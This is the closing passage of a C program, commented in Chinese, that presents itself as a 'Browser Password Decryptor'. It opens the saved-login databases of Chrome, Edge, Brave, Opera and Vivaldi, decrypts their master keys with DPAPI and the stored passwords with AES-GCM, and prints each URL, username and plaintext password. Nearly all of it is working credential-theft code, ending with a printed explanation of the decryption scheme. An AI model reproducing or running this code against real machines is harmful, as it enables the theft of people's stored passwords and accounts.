     int count = 0;        // 总记录数
     int successCount = 0; // 成功解密的记录数
     
     // 遍历所有记录
     while (sqlite3_step(stmt) == SQLITE_ROW) {
         count++;
         
         // 获取网站URL和用户名
         const char* url = (const char*)sqlite3_column_text(stmt, 0);
         const char* username = (const char*)sqlite3_column_text(stmt, 1);
         
         // 获取加密的密码数据(二进制格式)
         const unsigned char* encryptedPassword = sqlite3_column_blob(stmt, 2);
         int passwordSize = sqlite3_column_bytes(stmt, 2);
         
         // 尝试解密密码
         char* password = DecryptPassword(encryptedPassword, passwordSize, masterKey, masterKeyLen);
         
         // 检查是否成功解密(解密成功的密码不以方括号开头)
         if (password && password[0] != '[') {
             successCount++;
         }
         
         // 输出结果
         printf("URL: %s\n", url ? url : "[No URL]");
         printf("Username: %s\n", username ? username : "[No Username]");
         printf("Password: %s\n", password ? password : "[Decryption Failed]");
         printf("--------------------\n");
         
         free(password); // 释放解密后的密码内存
     }
     
     // 显示统计信息
     if (count == 0) {
         printf("No saved passwords found\n");
     } else {
         printf("Found %d password entries, successfully decrypted %d\n", count, successCount);
     }
     
     // 清理资源
     sqlite3_finalize(stmt);    // 释放预处理语句
     sqlite3_close(db);         // 关闭数据库
     DeleteFileA(tempFile);     // 删除临时文件
     free(tempFile);            // 释放临时文件路径
     free(masterKey);           // 释放主密钥
 }
 
 /**
  * 主函数 - 程序入口点
  * 
  * 功能流程:
  * 1. 设置控制台字符编码为UTF-8
  * 2. 定义支持的浏览器列表
  * 3. 显示程序信息
  * 4. 依次处理每个浏览器的密码提取
  * 5. 显示完成信息和解密原理说明
  * 
  * 返回值:
  * 0 - 程序正常执行完成
  */
 int main() {
     // 设置控制台输出编码为UTF-8
     // 这样可以正确显示Unicode字符(对多语言支持很重要)
     SetConsoleOutputCP(CP_UTF8);
     
     // 定义支持的浏览器列表
     // 每个结构包含: 浏览器名称、密码数据库路径、Local State文件路径
     Browser browsers[MAX_BROWSERS] = {
         // Google Chrome
         {"Google Chrome", 
          "Google\\Chrome\\User Data\\Default\\Login Data",      // 密码数据库
          "Local State"},                                         // 主密钥文件
         
         // Microsoft Edge (基于Chromium的新版本)
         {"Microsoft Edge", 
          "Microsoft\\Edge\\User Data\\Default\\Login Data", 
          "Local State"},
         
         // Brave Browser
         {"Brave Browser", 
          "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", 
          "Local State"},
         
         // Opera浏览器 (注意Opera的路径结构略有不同)
         {"Opera", 
          "Opera Software\\Opera Stable\\Login Data", 
          "..\\..\\Opera Stable\\Local State"},
         
         // Vivaldi浏览器
         {"Vivaldi", 
          "Vivaldi\\User Data\\Default\\Login Data", 
          "Local State"}
     };
     
     // 显示程序标题和功能信息
     printf("========================================\n");
     printf("  Browser Password Decryptor - Full Version\n");
     printf("  * Supports direct DPAPI decryption\n");
     printf("  * Supports v10 format AES-GCM decryption\n");
     printf("========================================\n");
     printf("Starting password extraction...\n");
     
     // 处理每个浏览器
     for (int i = 0; i < MAX_BROWSERS; i++) {
         ExtractBrowserPasswords(&browsers[i]);
     }
     
     // 显示完成信息和解密原理说明
     printf("\nCompleted.\n");
     printf("\nDecryption explanation:\n");
     printf("1. Old encryption: Directly using DPAPI to store passwords\n");
     printf("2. v10 format encryption (Chrome/Edge):\n");
     printf("   a. Extract the encrypted master key from Local State file\n");
     printf("   b. Decrypt the master key using DPAPI\n");
     printf("   c. Passwords encrypted with AES-GCM and the master key, format is v10\n");
     printf("   d. v10 data format: 'v10' + IV(12 bytes) + Encrypted Data + Auth Tag(16 bytes)\n");
     printf("Press any key to exit...\n");
     
     // 等待用户按键后退出
     getchar();
     
     return 0;  // 程序正常结束
 } 